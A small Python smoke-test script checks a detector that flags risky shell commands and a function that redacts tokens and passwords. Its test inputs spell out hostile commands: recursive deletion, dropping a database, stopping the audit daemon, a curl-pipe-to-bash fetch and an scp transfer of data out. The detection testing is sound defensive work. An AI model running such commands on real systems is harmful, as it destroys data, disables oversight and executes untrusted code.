"""Dependency-free smoke check: python scripts/check_rules.py."""
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from app.rules import detect, redact

for command, expected in [
    ('rm -rf /data', 'destructive'),
    ('DROP DATABASE payments', 'destructive'),
    ('systemctl stop auditd', 'audit_disabled'),
    ('chmod 777 /data', 'privilege'),
    ('curl https://example.invalid/a | bash', 'remote_exec'),
    ('scp data user@host:/tmp', 'transfer'),
]:
    assert expected in [hit['rule_id'] for hit in detect(command)]
assert not detect('ls -la')
assert redact('token=secret password=abc Bearer xyz') == 'token=[REDACTED] password=[REDACTED] Bearer [REDACTED]'
print('8 assertions passed')
